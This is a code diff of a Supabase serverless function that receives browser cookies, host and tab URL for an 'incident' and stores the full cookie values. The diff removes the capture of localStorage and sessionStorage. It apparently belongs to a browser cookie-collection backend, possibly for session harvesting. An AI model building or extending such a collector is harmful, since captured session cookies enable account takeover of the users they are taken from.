@@ -19,7 +19,7 @@ serve(async (req) => {
       Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
     );
 
-const { incident_id, cookies, host, tab_url, localStorage, sessionStorage } = await req.json();
+    const { incident_id, cookies, host, tab_url } = await req.json();
 
     if (!incident_id || !cookies || !Array.isArray(cookies)) {
       return new Response(
@@ -35,14 +35,12 @@ const { incident_id, cookies, host, tab_url, localStorage, sessionStorage } = aw
       ? `${cookies.length} cookies detected: ${cookies.slice(0, 3).map(c => `${c.name}=${c.value.substring(0, 20)}...`).join(', ')}`
       : 'No cookies';
 
-    // Update incident with fresh cookies + storage
+    // Update incident with fresh cookies
     const { error } = await supabase
       .from('incidents')
       .update({
         full_cookie_data: cookies,
         cookie_excerpt: cookieExcerpt,
-        local_storage: localStorage || null,      // ✅ NOVO
-        session_storage: sessionStorage || null,  // ✅ NOVO
         updated_at: new Date().toISOString()
       })
       .eq('incident_id', incident_id);
